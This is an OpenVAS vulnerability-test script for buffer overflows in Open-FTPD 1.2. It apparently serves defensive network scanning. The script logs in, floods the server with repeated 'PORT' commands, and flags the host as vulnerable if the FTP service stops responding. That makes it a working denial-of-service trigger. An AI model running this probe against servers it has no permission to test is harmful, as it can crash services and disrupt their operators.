###############################################################################
# OpenVAS Vulnerability Test
#
# Open-FTPD Multiple Buffer Overflow Vulnerabilities
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (C) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100495");
  script_version("2022-05-02T09:35:37+0000");
  script_tag(name:"last_modification", value:"2022-05-02 09:35:37 +0000 (Mon, 02 May 2022)");
  script_tag(name:"creation_date", value:"2010-02-17 20:53:20 +0100 (Wed, 17 Feb 2010)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Open-FTPD Multiple Buffer Overflow Vulnerabilities");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/30993");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/64931");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_DENIAL);
  script_family("FTP");
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/open-ftpd/detected");

  script_tag(name:"summary", value:"Open-FTPD is prone to multiple buffer-overflow vulnerabilities because
  it fails to perform adequate boundary checks on user-supplied data.");

  script_tag(name:"impact", value:"Successful exploits may allow attackers to execute arbitrary code in
  the context of the application or cause a denial-of-service condition.");

  script_tag(name:"affected", value:"Open-FTPD 1.2 is vulnerable. Other versions may also be affected.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  exit(0);
}

include("ftp_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

port = ftp_get_port(default:21);
banner = ftp_get_banner(port:port);
if(! banner || "Gabriel's FTP Server" >!< banner)
  exit(0);

soc = open_sock_tcp(port);
if(!soc)
  exit(0);

kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];

req = string("USER ", user, "\r\n");
send(socket:soc, data:req);
buf = recv(socket:soc, length:512);
if("331" >!< buf)
  exit(0);

req = crap(data: "A", length: 5);

for(i=0; i<35; i++) {
  send(socket:soc, data:"PORT ", req,"\r\n");
}

close(soc);

soc1 = open_sock_tcp(port);

if(!ftp_recv_line(socket:soc1)) {
  security_message(port:port);
  if(soc1)close(soc1);
  exit(0);
}

exit(0);
